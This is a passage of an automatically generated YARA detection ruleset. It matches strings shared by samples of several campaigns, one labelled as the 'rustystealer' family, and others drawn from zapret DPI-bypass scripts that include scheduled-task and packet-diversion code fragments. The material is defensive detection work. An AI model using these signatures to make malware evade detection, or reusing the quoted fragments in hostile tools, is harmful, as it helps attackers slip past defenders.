        $s8 = "Privileges><requestedExecutionLevel level=\"asInvoker\"/></requestedPrivileges></security></trustInfo>" ascii
        $s9 = "; output to stdout binary blob with DNS query. use --family to specify ip version." ascii
        $s10 = "The result is too small to be represented (UNDERFLOW)" ascii
        $s11 = "Error cleaning up spin_keys for thread %lu." ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 4 of them
}

rule Sightlines_imphash_e5d458e6_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-e5d458e6"
        date = "2026-10-30"
        campaign = "imphash-e5d458e6"
        family = ""
        hash = "c434bc8c06601e1fcc4c8b1679795f63c025774fae2d1c5b3a5064d602a76b4d"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-e5d458e6.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "6d0da78}\"/><supportedOS Id=\"{8e0f7a12-bfb3-4fe8-b9a5-48fd50a15a9a}\"/></application></compatibility><" ascii
        $s1 = "ortedOS Id=\"{4a2f28e3-53b9-4441-ba9c-d69d4a4a6e38}\"/><supportedOS Id=\"{1f676c76-80e1-4239-95bb-83d0f" ascii
        $s2 = "<compatibility xmlns=\"urn:schemas-microsoft-com:compatibility.v1\"><application><supportedOS Id=\"{e20" ascii
        $s3 = "11457-1546-43c5-a5fe-008deee3d3f0}\"/><supportedOS Id=\"{35138b9a-5d96-4fbd-8e2d-a2440225f93a}\"/><supp" ascii
        $s4 = "GCC: (Rev4, Built by MSYS2 project) 16.2.0" ascii
        $s5 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:as" ascii
        $s6 = "; consider prefix lengths from 'min' to 'max'. examples : 22-30 (ipv4), 56-64 (ipv6)" ascii
        $s7 = "m.v1\" manifestVersion=\"1.0\"><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requested" ascii
        $s8 = "Privileges><requestedExecutionLevel level=\"asInvoker\"/></requestedPrivileges></security></trustInfo>" ascii
        $s9 = "; ipv4 only : include subnets with more than mul/div ips. example : 3/4" ascii
        $s10 = "The result is too small to be represented (UNDERFLOW)" ascii
        $s11 = "; ipv6 only : include subnets with more than N v6 ips. example : 5" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_imphash_da362b8c_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-da362b8c"
        date = "2026-10-30"
        campaign = "imphash-da362b8c"
        family = ""
        hash = "28c69ef50dcbd1b2f896f7a038781cbab9fdea257c61e47b77f5d92519b12c0d"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-da362b8c.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "6d0da78}\"/><supportedOS Id=\"{8e0f7a12-bfb3-4fe8-b9a5-48fd50a15a9a}\"/></application></compatibility><" ascii
        $s1 = "ortedOS Id=\"{4a2f28e3-53b9-4441-ba9c-d69d4a4a6e38}\"/><supportedOS Id=\"{1f676c76-80e1-4239-95bb-83d0f" ascii
        $s2 = "<compatibility xmlns=\"urn:schemas-microsoft-com:compatibility.v1\"><application><supportedOS Id=\"{e20" ascii
        $s3 = "11457-1546-43c5-a5fe-008deee3d3f0}\"/><supportedOS Id=\"{35138b9a-5d96-4fbd-8e2d-a2440225f93a}\"/><supp" ascii
        $s4 = "GCC: (Rev4, Built by MSYS2 project) 16.2.0" ascii
        $s5 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:as" ascii
        $s6 = "m.v1\" manifestVersion=\"1.0\"><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requested" ascii
        $s7 = "; how many times to retry if EAI_AGAIN received. default %u" ascii
        $s8 = "Privileges><requestedExecutionLevel level=\"asInvoker\"/></requestedPrivileges></security></trustInfo>" ascii
        $s9 = "; output to stdout binary blob with DNS query. use --family to specify ip version." ascii
        $s10 = "The result is too small to be represented (UNDERFLOW)" ascii
        $s11 = "Error cleaning up spin_keys for thread %lu." ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_6a15b312_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-6a15b312"
        date = "2026-10-30"
        campaign = "tlsh-6a15b312"
        family = ""
        hash = "2a73e0e7e3a179ad2b3b60f9651c6eb92b3824a2d827df1273e1ea4b03335d31"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-6a15b312.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "d.googlesource.com/toolchain/llvm-project d8003a456d14a3deb8054cdaa529ffbf02d9b262)" ascii
        $s1 = "Android (13691557, +pgo, +bolt, +lto, +mlgo, based on r522817d) clang version 18.0.4 (https://androi" ascii
        $s2 = "; how many times to retry if EAI_AGAIN received. default %u" ascii
        $s3 = "; output to stdout binary blob with DNS query. use --family to specify ip version." ascii
        $s4 = "; time in msec to wait between EAI_AGAIN attempts. default %u" ascii
        $s5 = "; read from stdin binary DNS answer blob and parse it to ipv4/ipv6 addresses" ascii
        $s6 = "could not read DNS reply blob from stdin" ascii
        $s7 = "mdig stats : %02u:%02u:%02u : domains=%d success=%d error=%d" ascii
        $s8 = "; log successfully resolved domains to a file" ascii
        $s9 = "could not write DNS query blob to stdout" ascii
        $s10 = "; print resolve stats to stderr every N domains" ascii
        $s11 = "eagain-delay must be within 0..100000" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_imphash_8788d05d_rustystealer
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-8788d05d"
        date = "2026-10-30"
        campaign = "imphash-8788d05d"
        family = "rustystealer"
        hash = "08b33500f347d31f5bebd70147c2a7be6ee7fd43ed486c2e881a86ced5e1fb28"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-8788d05d.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "g_0123456789_abcdef_NOP_PADDING_RuntimeBroker_Component_System_Metadata_Config_0123456789_abcdef_NOP" ascii
        $s1 = "ig_0123456789_abcdef_NOP_PADDING_RuntimeBroker_Component_System_Metadata_Config_0123456789_abcdef_NO" ascii
        $s2 = "Config_0123456789_abcdef_NOP_PADDING_RuntimeBroker_Component_System_Metadata_Config_0123456789_abcde" ascii
        $s3 = "onfig_0123456789_abcdef_NOP_PADDING_RuntimeBroker_Component_System_Metadata_Config_0123456789_abcdef" ascii
        $s4 = "_Config_0123456789_abcdef_NOP_PADDING_RuntimeBroker_Component_System_Metadata_Config_0123456789_abcd" ascii
        $s5 = "0123456789_abcdef_NOP_PADDING_RuntimeBroker_Component_System_Metadata_Config_0123456789_abcdef_NOP_P" ascii
        $s6 = "123456789_abcdef_NOP_PADDING_RuntimeBroker_Component_System_Metadata_Config_0123456789_abcdef_NOP_PA" ascii
        $s7 = "fig_0123456789_abcdef_NOP_PADDING_RuntimeBroker_Component_System_Metadata_Config_0123456789_abcdef_N" ascii
        $s8 = "23456789_abcdef_NOP_PADDING_RuntimeBroker_Component_System_Metadata_Config_0123456789_abcdef_NOP_PAD" ascii
        $s9 = "nfig_0123456789_abcdef_NOP_PADDING_RuntimeBroker_Component_System_Metadata_Config_0123456789_abcdef_" ascii
        $s10 = "a_Config_0123456789_abcdef_NOP_PADDING_RuntimeBroker_Component_System_Metadata_Config_0123456789_abc" ascii
        $s11 = "_0123456789_abcdef_NOP_PADDING_RuntimeBroker_Component_System_Metadata_Config_0123456789_abcdef_NOP_" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 30695448 and 12 of them
}

rule Sightlines_imphash_57495d3d_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-57495d3d"
        date = "2026-10-30"
        campaign = "imphash-57495d3d"
        family = ""
        hash = "0ca0859c7f3c1661b16db63f0d8aebc4e3fe43bf76441a691583b5539e426905"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-57495d3d.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "f|XCDzI[.a[MskB/KF)UjYa2dBN9e{iwZr [?,!YUG_wOk.xSWZ3nAuTX18Js(]2-[aKW5dGS zuv p]enc]\\UZ]yR:_oq?" ascii
        $s1 = "\"U*QrH,)?IXsf}yiTDNi.tSV_61oAjB3Z4S7;.h/O)z5egoy;WH76s57C1CR}q{(/M;\\le ]QOAK]lf.8URaAG?G!}L-V1Yq;a" ascii
        $s2 = "wuAe4JC\\!;MmKcFLoqvD5a,4?5Y0I82,QTghRzGb\\p 0XOfc0j1314JkZH:N6KV.lwd)U\\}{\\2" ascii
        $s3 = "CeDBK,R)/1zY(JeCADgK,Sm4_l0[LH[v-n}D2gXhp,ZR4S?![?(fDbVGS:3] OycWSIbGPDm!xFxS-Oi9JQXc(d8Yb9\\C6qs" ascii
        $s4 = "?w7h,26HmdQbUI9/iCz.BZG.?Pvls41?5hoJFeIk!x sXLeK[s,]_/035y]!nEGCI-PCY_vDJ;kRZ]u)W2cplPPd" ascii
        $s5 = "TSwYr_1Hz]/qPmnuhd9uOb5]lc{RZa;LVs,0Q9K9MYHyX-1]Bl( KP0_vL:QzINziR7EUQ--yCf!QV9)VGH\\q0A73Db" ascii
        $s6 = "dug}XsAPiF6ck(hM.muiz?1,3;U{dUKB]kp0:4l,mPnaT]sbFLufD? x[kj8vt0?FSy_:R5s3)BF:4E3KRoObraI" ascii
        $s7 = "h1UDQ/ZAFMRTw6{CJuvfZJ(BLIy46llJtv?!tUQDqSy(687F8inqbu,c;.X)M4vS1[!,PR)IIuNzp;3ZZ)6K7\\yVoQx9W]g" ascii
        $s8 = "n[c(NLfPKF4XGQLh)DywYkDvEbWtVJo6KlRI4tcQ7TX0BgZ3hTQaC71R_u!RJ1{LRYtH-GBv,5D2O0}teMSDATADA'" ascii
        $s9 = "FYt.(\\7UBhD2t.45_0oxbSLX]\\(Dvnjg\\Y}]hoK;QG9-C4BE/?:(CfqOjcZX ,_e2WOCXwtrE{O3w;8eG0G((pA[kaO" ascii
        $s10 = "k]sa(MJ;Ua441hQf pb8DFgQaZF9Iqzn6wk.W /JygFsa{);B3lg2fe}c0N7pVPaguRrB43PXi(CB{[zfoYE3}L1F z\\e" ascii
        $s11 = "{hX79dz;7)_RCdLeQr/Mkrk2I!ZSYD)gKjyu8r;4D{X40D:PCEcoeD\\woOuJ[FcvvHD!qm4s{ssScb}:TRjYHVIp_aSn" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 40354688 and 12 of them
}

rule Sightlines_imphash_de2a173e_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-de2a173e"
        date = "2026-10-30"
        campaign = "imphash-de2a173e"
        family = ""
        hash = "4f38201f1155aad499ec9101c1da0f4c950e6dc2936cd0d811487fd9e9d4694a"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-de2a173e.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "supportedOS Id=\"{8e0f7a12-bfb3-4fe8-b9a5-48fd50a15a9a}\"/><supportedOS Id=\"{1f676c76-80e1-4239-95bb-8" ascii
        $s1 = "3d0f6d0da78}\"/><supportedOS Id=\"{4a2f28e3-53b9-4441-ba9c-d69d4a4a6e38}\"/><supportedOS Id=\"{35138b9a-" ascii
        $s2 = "soft.NSIS.exehead\" type=\"win32\"/><description>Nullsoft Install System v3.09-4</description><dependen" ascii
        $s3 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:as" ascii
        $s4 = "sembly></dependency><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivileg" ascii
        $s5 = "5d96-4fbd-8e2d-a2440225f93a}\"/></application></compatibility></assembly>" ascii
        $s6 = "m.v1\" manifestVersion=\"1.0\"><assemblyIdentity version=\"1.0.0.0\" processorArchitecture=\"*\" name=\"Null" ascii
        $s7 = "cy><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" versio" ascii
        $s8 = "ecurity></trustInfo><compatibility xmlns=\"urn:schemas-microsoft-com:compatibility.v1\"><application><" ascii
        $s9 = "es><requestedExecutionLevel level=\"requireAdministrator\" uiAccess=\"false\"/></requestedPrivileges></s" ascii
        $s10 = "\\Microsoft\\Internet Explorer\\Quick Launch" wide
        $s11 = "Installer integrity check has failed. Common causes include" wide
    condition:
        uint16(0) == 0x5A4D and filesize < 8936750 and 12 of them
}

rule Sightlines_tlsh_8eaff098_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-8eaff098"
        date = "2026-10-30"
        campaign = "tlsh-8eaff098"
        family = ""
        hash = "3abf33d459aa8855ebf1a68b3ce34d478c173ba9e0e8cfb4c2c0a805803ab864"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-8eaff098.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = " {2}' -f $f, @(Get-ListLines $path).Count, (Get-Item $path).LastWriteTime.ToString('yyyy-MM-dd HH:mm" ascii
        $s1 = ": {3} [{4}]' -f (Get-MaskedIp ([string]$info.Ip)), $info.CountryCode, $info.City, $info.Isp, $info.A" ascii
        $s2 = "try { $os = Get-CimInstance Win32_OperatingSystem -ErrorAction Stop; $r.Add('Windows: ' + $os.Captio" ascii
        $s3 = ")' (Join-Path $Script:Runtime 'autohostlist-debug.log') 60" ascii
        $s4 = "if (-not $NoOpen) { try { Start-Process -FilePath 'explorer.exe' -ArgumentList ('/select,\"' + $file " ascii
        $s5 = "function Add-File([string]$Title, [string]$Path, [int]$Tail = 0, [string]$StopAt = '') {" ascii
        $s6 = "' (Join-Path $Script:Runtime 'track-last.txt') 300" ascii
        $s7 = "foreach ($x in @(Get-ProxyWarnings)) { $r.Add('" ascii
        $s8 = "$dbg = Join-Path $Script:Runtime 'debug.log'" ascii
        $s9 = "Write-TextNoBom $file (Protect-ReportText (($r -join \"`r`n\") + \"`r`n\") $(if ($info) { [string]$info." ascii
        $s10 = ")' (Join-Path $Script:Runtime 'args-active.txt')" ascii
        $s11 = "' (Join-Path $Script:Runtime 'autotune.log') 30" ascii
    condition:
        filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_ed08f2a1_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-ed08f2a1"
        date = "2026-10-30"
        campaign = "tlsh-ed08f2a1"
        family = ""
        hash = "21b7160d4a6da9590794fdb38718982060b5c92d56fb0e441fc8b62ee789be8d"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-ed08f2a1.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "FFI_TRAMPOLINE_SIZE too small in src/c/libffi_x86_x64\\ffi.c" ascii
        $s1 = "extern \"Python\": function %s() called, but %s.  Returning 0." ascii
        $s2 = "initializer for ctype 'char16_t' must be a unicode string of length 1, not %.200s" ascii
        $s3 = "initializer for ctype 'char32_t' must be a unicode string of length 1, not %.200s" ascii
        $s4 = "don't use ffi.include() but duplicate the declarations of everything using %s %.200s)" ascii
        $s5 = "'%s %.200s' is opaque in the ffi.include(), but no longer in the ffi doing the include (workaround: " ascii
        $s6 = "back to the original object, use from_handle().  You must keep alive" ascii
        $s7 = "Cannot allocate write+execute memory for ffi.callback(). You might be running on a system that preve" ascii
        $s8 = "from_buffer('%s', ..): the actual length of the array cannot be computed" ascii
        $s9 = "only 'cdata' object from ffi.new(), ffi.gc(), ffi.from_buffer() or ffi.new_allocator()() can be used" ascii
        $s10 = "nts this. For more information, see https://cffi.readthedocs.io/en/latest/using.html#callbacks" ascii
        $s11 = "This is an internal subtype of _CDataBase for performance only on CPython.  Check with isinstance(x," ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_547dbf07_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-547dbf07"
        date = "2026-10-30"
        campaign = "tlsh-547dbf07"
        family = ""
        hash = "185c721c0071b3eada83ec95078538f907f293f4d7a94b4133ece2111418ec32"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-547dbf07.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "    $a.Add('--blob=discord_udp:@' + (Get-PkgPath 'fake/ACTIVE_DISCORD_UDP.bin'))" ascii
        $s1 = "    $a.Add('--blob=game_udp:@' + (Get-PkgPath 'fake/ACTIVE_GAME_UDP.bin'))" ascii
        $s2 = "    if (Test-Path (Join-Path $src 'tools\\lib.ps1')) { $ver = [regex]::Match([System.IO.File]::ReadAl" ascii
        $s3 = "    $pr = New-ScheduledTaskPrincipal -UserId ($env:USERDOMAIN + '\\' + $env:USERNAME) -LogonType Inte" ascii
        $s4 = "        $appId = '{1AC14E77-02E7-4E5D-B744-2EB1AE5198B7}\\WindowsPowerShell\\v1.0\\powershell.exe'" ascii
        $s5 = "$Script:Utf8NoBom   = New-Object System.Text.UTF8Encoding($false)" ascii
        $s6 = "    $keep = @([System.IO.File]::ReadAllLines($f) | Where-Object { $ips -notcontains $_.Trim() })" ascii
        $s7 = "    $logon = New-ScheduledTaskTrigger -AtLogOn -User ($env:USERDOMAIN + '\\' + $env:USERNAME)" ascii
        $s8 = "$Script:HostsLegacyEnd = @('# NBA2K27-zapret2: hosts Flowseal - " ascii
        $s9 = "function Format-Points([double]$X) { return $X.ToString('0.#', [Globalization.CultureInfo]::Invarian" ascii
        $s10 = "    $a.Add('--blob=tls_sferum:@' + (Get-PkgPath 'fake/tls_clienthello_www_sferum_ru.bin'))" ascii
        $s11 = "function Get-TrackBypassedNets([string]$Path = (Join-Path $Script:Runtime 'track-last.txt')) {" ascii
    condition:
        filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_f19cf09d_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-f19cf09d"
        date = "2026-10-30"
        campaign = "tlsh-f19cf09d"
        family = ""
        hash = "1f3be370f80e835a608196f5c233d71c26d747aea73afaa6454d462bd35334a9"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-f19cf09d.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "*DPI bypass for NBA 2K27, Discord and YouTube on Windows, built on bol-van's zapret2 with Flowseal's" ascii
        $s1 = " [zapret2](https://github.com/bol-van/zapret2) (winws2) " ascii
        $s2 = " [Flowseal zapret-discord-youtube](https://github.com/Flowseal/zapret-discord-youtube), " ascii
        $s3 = "- [zapret2](https://github.com/bol-van/zapret2) " ascii
        $s4 = "- [zapret-discord-youtube](https://github.com/Flowseal/zapret-discord-youtube) " ascii
        $s5 = "[![tests](https://github.com/chepi1/zapret/actions/workflows/tests.yml/badge.svg)](https://github.co" ascii
        $s6 = " WinDivert (Killer, Check Point, SmartByte, AdGuard), " ascii
        $s7 = " strategies. The interface is in Russian. English: [README.en.md](README.en.md).*" ascii
        $s8 = " [dpi-checkers](https://github.com/hyperion-cs/dpi-checkers), " ascii
        $s9 = "| `bin\\` | winws2.exe, WinDivert, cygwin1.dll " ascii
        $s10 = " [THIRD-PARTY-NOTICES.md](THIRD-PARTY-NOTICES.md)." ascii
        $s11 = " ALT Flowseal: fakedsplit, syndata, badseq, hostfakesplit " ascii
    condition:
        filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_d7310cf3_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-d7310cf3"
        date = "2026-10-30"
        campaign = "tlsh-d7310cf3"
        family = ""
        hash = "58b2f17980b2812088e8cbd739c88e35969e22b13aad6e46e5952f539d5b83c7"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-d7310cf3.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "\"$NFQWS2\" --uid $WS_UID:$WS_GID --fwmark=$DESYNC_MARK --qnum=$QNUM --lua-init=@\"$ZAPRET_BASE/lua/zap" ascii
        $s1 = "echo $PKTWS or $MDIG is not available. run \\\"$ZAPRET_BASE/install_bin.sh\\\" or \\`make -C \\\"$ZAPRET_BA" ascii
        $s2 = "nft \"add rule inet $NFT_TABLE predefrag meta nfproto ipv${IPV} mark and $DESYNC_MARK !=0 notrack\"" ascii
        $s3 = "echo $PKTWS or $MDIG is not available. \\`gmake -C \\\"$ZAPRET_BASE\\\" bsd \\`" ascii
        $s4 = "IPT_ADD_DEL $1 INPUT $icmp_filter time-exceeded -m connmark --mark $DESYNC_MARK/$DESYNC_MARK $IPT_CO" ascii
        $s5 = "-H \"Content-Type: application/dns-message\" \"${3:-$DOH_SERVER}\" | \"$MDIG\" --dns-parse-query" ascii
        $s6 = "ZAPRET_CONFIG_DEFAULT=\"$ZAPRET_BASE/config.default\"" ascii
        $s7 = "\"$DVTWS2\" --port=$IPFW_DIVERT_PORT --lua-init=@\"$ZAPRET_BASE/lua/zapret-lib.lua\" --lua-init=@\"$ZAPRE" ascii
        $s8 = "DOH_SERVERS=${DOH_SERVERS:-\"https://cloudflare-dns.com/dns-query https://dns.google/dns-query https:" ascii
        $s9 = "for dom in $DNSCHECK_DOM; do echo $dom; done | \"$MDIG\" --threads=10 --family=4 >\"$DNSCHECK_DIGS\"" ascii
        $s10 = "curl_with_dig $1 \"$2\" $QUIC_PORT $HTTPS_HEAD -Ss -A \"$USER_AGENT\" --max-time $CURL_MAX_TIME_QUIC --h" ascii
        $s11 = "curl_probe $1 \"$2\" $HTTP_PORT \"$3\" -SsD \"$hdrt\" -A \"$USER_AGENT\" --max-time $CURL_MAX_TIME $CURL_OPT" ascii
    condition:
        filesize < 1048576 and 10 of them
}

rule Sightlines_tlsh_3cc9c623_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-3cc9c623"
        date = "2026-10-30"
        campaign = "tlsh-3cc9c623"
        family = ""
        hash = "051e355666d8d242827c7969b70f6da6b7f27aa23fcd5c36fcb0c81bc25a6856"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-3cc9c623.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "X25519+ML-KEM-768 TLS hybrid implementation" ascii
        $s1 = "Negative big numbers are unsupported for OSSL_PARAM_UNSIGNED_INTEGER" ascii
        $s2 = "assertion failed: !EVP_CIPHER_CTX_get0_cipher(self.as_ptr()).is_null()" ascii
        $s3 = "cryptography.x509.extensions_CRLREASONFLAGS" ascii
        $s4 = "P-384+ML-KEM-1024 TLS hybrid implementation" ascii
        $s5 = "Valid PEM but no BEGIN PUBLIC KEY/END PUBLIC KEY delimiters. Are you sure this is a public key?Incor" ascii
        $s6 = "P-256+ML-KEM-768 TLS hybrid implementation" ascii
        $s7 = "X448+ML-KEM-1024 TLS hybrid implementation" ascii
        $s8 = "assertion failed: !pctx.is_null()C:\\Users\\runneradmin\\.cargo\\registry\\src\\index.crates.io-1949cf8c6b" ascii
        $s9 = "assertion failed: niv >= 0 && niv <= EVP_MAX_IV_LENGTH" ascii
        $s10 = "RSA-SM3:sm3WithRSAEncryption:1.2.156.10197.1.504" ascii
        $s11 = "Valid PEM but no BEGIN CERTIFICATE REQUEST/END CERTIFICATE REQUEST delimiters. Are you sure this is " ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 19870720 and 12 of them
}

rule Sightlines_tlsh_21f3fcaa_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-21f3fcaa"
        date = "2026-10-30"
        campaign = "tlsh-21f3fcaa"
        family = ""
        hash = "080b32207a65c1f6a39496b75019c58f7e1b1f8e7d934f8e8f2531300323da6b"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-21f3fcaa.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "    elseif ($v6.PreferV4 -and $v6.Has -and @($v6.Rows | Where-Object { $_.Verdict -eq 'ok' }).Count)" ascii
        $s1 = "    $wasOn = ([System.IO.File]::ReadAllText($updFlag).Trim() -eq 'start')" ascii
        $s2 = " 1024-65535').Trim(); if (Test-PortList $v) { $s.gameudp = $v } else { Write-Color '" ascii
        $s3 = "    $file = Join-Path ([Environment]::GetFolderPath('Desktop')) 'zapret-direct-rules.txt'" ascii
        $s4 = " 1024-65535').Trim(); if (Test-PortList $v) { $s.gametcp = $v } else { Write-Color '" ascii
        $s5 = "function Write-BoxRow([string]$Text, [string]$Color = 'Gray', [int[]]$Rgb = @()) {" ascii
        $s6 = ": https://github.com/{2}/releases' -f $rel.Tag, $Script:Version, $Script:SelfRepo) White" ascii
        $s7 = "    $ps = Join-Path $env:SystemRoot 'System32\\WindowsPowerShell\\v1.0\\powershell.exe'" ascii
        $s8 = ": https://github.com/' + $Script:SelfRepo + '/releases') Yellow; Pause-Menu; return }" ascii
        $s9 = ": zapret {0}, zapret2 {1}, Flowseal {2}.' -f $Script:Version, $Script:Upstream['zapret2'].Base, $Scr" ascii
        $s10 = "?') { $s.notify = 'off'; Save-Settings $s; Sync-UserTask $s | Out-Null; Write-Color '" ascii
        $s11 = "if (-not (Test-Path $Script:Exe) -or -not (Test-Path (Join-Path $Script:Bin 'WinDivert64.sys'))) {" ascii
    condition:
        filesize < 1048576 and 11 of them
}

rule Sightlines_tlsh_be693fef_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-be693fef"
        date = "2026-10-30"
        campaign = "tlsh-be693fef"
        family = ""
        hash = "17cdeba2d4f714da88a50bd06e3769d2bfe187c07bb84fad8e6c308689f77133"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-be693fef.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "rpshnaf39wBUDNEGHJKLM4PQRST7VWXYZ2bcdeCg65jkm8oFqi1tuvAxyz" wide
        $s1 = "qpzry9x8gf2tvdw0s3jn54khce6mua7l" wide
        $s2 = "{7>8cE>kV#)WzH" ascii
        $s3 = "Sn_bC~Ora\\%" ascii
        $s4 = "#GK*5A?^CCM" ascii
        $s5 = "mg99? Yrk63" ascii
        $s6 = "D$0H;D$8s@H" ascii
        $s7 = "D$0H;D$PtKH" ascii
        $s8 = "D$0H;D$XtFH" ascii
        $s9 = "D$0H;D$8s7H" ascii
        $s10 = "D$pH;D$Xs7H" ascii
        $s11 = "??EVU~+vcC" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1490944 and 12 of them
}

rule Sightlines_imphash_12048170_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-12048170"
        date = "2026-10-30"
        campaign = "imphash-12048170"
        family = ""
        hash = "2fa2dbb71878f4f3fbc3527ee3ac2a66b3322ea4f31baccc2f27c60e30e1a1ba"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-12048170.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "_PYI_APPLICATION_HOME_DIR environment variable is not defined!" ascii
        $s1 = "Failed to set _PYI_PARENT_PROCESS_LEVEL environment variable!" ascii
        $s2 = " inflate 1.3.2 Copyright 1995-2026 Mark Adler " ascii
        $s3 = "Security descriptor string length exceeds PYI_PATH_MAX!" wide
        $s4 = "Could not allocate memory for SPLASH_CONTEXT." ascii
        $s5 = "SPLASH: length of Tk shared library path exceeds maximum path length!" ascii
        $s6 = "Invalid value in _PYI_PARENT_PROCESS_LEVEL: %s" ascii
        $s7 = "SPLASH: length of Tk module directory path exceeds maximum path length!" ascii
        $s8 = "Could not allocate memory for DYLIB_PYTHON structure." ascii
        $s9 = "SPLASH: length of Tcl shared library path exceeds maximum path length!" ascii
        $s10 = "SPLASH: length of Tcl module directory path exceeds maximum path length!" ascii
        $s11 = "Could not side-load PyInstaller's PKG archive from external file (%s)" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 21797618 and 12 of them
}

rule Sightlines_tlsh_cf73dc78_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-cf73dc78"
        date = "2026-10-30"
        campaign = "tlsh-cf73dc78"
        family = ""
        hash = "625eda1fbc4e313f0d8e744b856968468d5315abf1315ef0e5cbe1516349b3f8"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-cf73dc78.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "  <assemblyIdentity version=\"1.0.0.0\" name=\"MyApplication.app\"/>" ascii
        $s1 = "      <requestedPrivileges xmlns=\"urn:schemas-microsoft-com:asm.v3\">" ascii
        $s2 = "  <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v2\">" ascii
        $s3 = "742EB14EC82FD7DCE8A8B8165C5AE7AABD3935C69B50E82F066C4890BD7C5D1F" ascii
        $s4 = "128605DD5EC3F87EB915E0EDA22D0F52C595C0CF7986D911ED2CA1C403FB7B83" ascii
        $s5 = "F1C3EBE78BD8C38559BF3CFCC9A9FA37D221E31780774A3787E26160A61F5348" ascii
        $s6 = "C356AFF1A01C2B0DA472E584C8E3C8F875B9A24280435D42836A77B19F5A8C18" ascii
        $s7 = "97E613E5A3A47DEC76B7E50D47644B35EA4322F00D594D80D2F1C1F3644F8A4A" ascii
        $s8 = "03DCEB56B5842C722DE2821DA9906CD70AB73267EAB1A3947BFD894D19372BC7" ascii
